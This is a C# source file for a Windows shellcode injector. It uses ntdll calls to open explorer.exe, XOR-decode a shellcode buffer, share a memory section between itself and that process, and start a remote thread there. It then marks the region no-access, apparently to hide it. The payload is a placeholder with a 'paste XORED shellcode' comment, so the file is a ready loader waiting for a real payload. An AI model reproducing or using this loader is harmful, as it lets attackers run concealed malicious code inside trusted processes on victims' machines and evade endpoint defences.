using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

class NtSectionExec
{
	// NTSTATUS is an int
	[DllImport("ntdll.dll")]
	static extern int NtCreateSection(
		out IntPtr SectionHandle,
		uint DesiredAccess,
		IntPtr ObjectAttributes,          // optional, pass IntPtr.Zero
		ref long MaximumSize,             // PLARGE_INTEGER
		uint SectionPageProtection,
		uint AllocationAttributes,
		IntPtr FileHandle);               // optional, pass IntPtr.Zero = pagefile-backed

	[DllImport("ntdll.dll")]
	static extern int NtMapViewOfSection(
		IntPtr SectionHandle,
		IntPtr ProcessHandle,
		ref IntPtr BaseAddress,
		UIntPtr ZeroBits,
		UIntPtr CommitSize,
		IntPtr SectionOffset,             // optional, pass IntPtr.Zero
		ref UIntPtr ViewSize,
		uint InheritDisposition,
		uint AllocationType,
		uint Win32Protect);

	[DllImport("ntdll.dll", SetLastError = true)]
	static extern uint NtMapViewOfSection(
		IntPtr SectionHandle,
		IntPtr ProcessHandle,
		ref IntPtr BaseAddress,
		IntPtr ZeroBits,
		IntPtr CommitSize,
		out ulong SectionOffset,
		out int ViewSize,
		uint InheritDisposition,
		uint AllocationType,
		uint Win32Protect);

	[DllImport("ntdll.dll")]
	static extern int NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

	[DllImport("ntdll.dll")]
	static extern int NtClose(IntPtr Handle);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

	[DllImport("ntdll.dll", SetLastError = true)]
	static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint OldAccessProtection);

	// Helper: current process pseudo-handle (-1)
	static readonly IntPtr CurrentProcess = new IntPtr(-1);

	// Common constants (used below)
	const uint SECTION_ALL_ACCESS = 0xF001F;
	const uint PAGE_EXECUTE_READWRITE = 0x40;    // section page protection
	const uint PAGE_EXECUTE_READ = 0x20;         // view protection
	const uint PAGE_READWRITE = 0x04;
	const uint PAGE_READEXECUTE = 0x20;
	const uint SEC_COMMIT = 0x08000000;          // allocation attribute
	const uint PAGE_NOACCESS = 0x01;

	// SECTION_INHERIT_VIEW_SHARE = 1
	const uint ViewShare = 1;

	// Delegate signature matching the shellcode: returns int, no args
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int NativeFunc();

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	static void Main(string[] args)
	{
		IntPtr htargetProcess = default;
		Process[] targetProcess = Process.GetProcessesByName("explorer");

		htargetProcess = OpenProcess(0x001F0FFF, false, targetProcess[0].Id);
		//Console.WriteLine("Target PID is:" + targetProcess[0].Id);


		// Paste XORED shellcode
		byte[] shellcode = new byte[] { 0x90, 0x90, 0x90 };

		// Decrypt XOR with key 0x4F
		for (int i = 0; i < shellcode.Length; i++)
		{
			shellcode[i] = (byte)(((uint)shellcode[i] ^ 0x4F) & 0xFF);
		}

		long maxSize = shellcode.Length;
		IntPtr section = IntPtr.Zero;

		//Console.WriteLine("Creating section via NtCreateSection...");
		int status = NtCreateSection(
			out section,
			SECTION_ALL_ACCESS,
			IntPtr.Zero,
			ref maxSize,
			PAGE_EXECUTE_READWRITE,     // initial page protection for the section
			SEC_COMMIT,
			IntPtr.Zero                 // file handle: NULL => backed by pagefile
		);

		if (status != 0 || section == IntPtr.Zero)
		{
			//Console.WriteLine($"NtCreateSection failed: 0x{status:X8}");
			return;
		}
		//Console.WriteLine($"Section created: 0x{section.ToString("X")}");

		// Map view into current process
		IntPtr baseAddress = IntPtr.Zero;  // let the kernel choose the address
		UIntPtr viewSize = new UIntPtr((uint)shellcode.Length);
		status = NtMapViewOfSection(
			section,
			CurrentProcess,
			ref baseAddress,
			UIntPtr.Zero,
			UIntPtr.Zero,
			IntPtr.Zero,
			ref viewSize,
			ViewShare,
			0,
			PAGE_READWRITE  // map as executable+readable
		);

		if (status != 0 || baseAddress == IntPtr.Zero)
		{
			//Console.WriteLine($"NtMapViewOfSection failed: 0x{status:X8}");
			NtClose(section);
			return;
		}

		//Console.WriteLine($"Mapped at address: 0x{baseAddress.ToString("X")} (size {viewSize})");


		// Map view into remote process
		IntPtr targetbaseAddress = IntPtr.Zero;  // let the kernel choose the address
		UIntPtr targetviewSize = new UIntPtr((uint)shellcode.Length);
		status = NtMapViewOfSection(
			section,
			htargetProcess,
			ref targetbaseAddress,
			UIntPtr.Zero,
			UIntPtr.Zero,
			IntPtr.Zero,
			ref targetviewSize,
			ViewShare,
			0,
			PAGE_READEXECUTE  // map as executable+readable
		);

		if (status != 0 || targetbaseAddress == IntPtr.Zero)
		{
			//Console.WriteLine($"NtMapViewOfSection for target failed: 0x{status:X8}");
			NtClose(section);
			return;
		}

		//Console.WriteLine($"Mapped at remote address: 0x{targetbaseAddress.ToString("X")} (size {targetviewSize})");

		// Copy shellcode into the mapped region
		Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);


		unsafe
		{
			fixed (byte* p = &shellcode[0])
			{
				byte* p2 = p;
				
				//Convert DEC->HEX
				var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
				UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
				string bufHex = bufInt.ToString("x"); //Integer -> Hex

				//Console.WriteLine("[+] Payload Address on this executable: " + "0x" + bufHex);

			}
		}

		//Enumerate the threads of the remote process before creating a new one.
		List<int> threadList = new List<int>();
		ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
		foreach (ProcessThread thread in threadsBefore)
		{
			threadList.Add(thread.Id);
		}

		//Create a remote thread and execute it.
		IntPtr hRemoteThread;
		uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, htargetProcess, targetbaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

		//Enumerate threads from the given process.
		ProcessThreadCollection threads = Process.GetProcessById(targetProcess[0].Id).Threads;
		foreach (ProcessThread thread in threads)
		{
			if (!threadList.Contains(thread.Id))
			{
				//Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
				Console.WriteLine("\n");
			}

		}

		uint flOld = 0;
		uint sectionSize = (uint)viewSize;
		uint mapSectionModifyPerm = NtProtectVirtualMemory(htargetProcess, ref targetbaseAddress, ref sectionSize, PAGE_NOACCESS, ref flOld);

		// Clean up
		NtUnmapViewOfSection(CurrentProcess, baseAddress);
		//Console.WriteLine("[+] Local memory section unmapped!");
		//NtUnmapViewOfSection(htargetProcess, targetbaseAddress);
		NtClose(section);
		//Console.WriteLine("[+] Memory section closed!");
		//Console.WriteLine("Done.");
	}
}
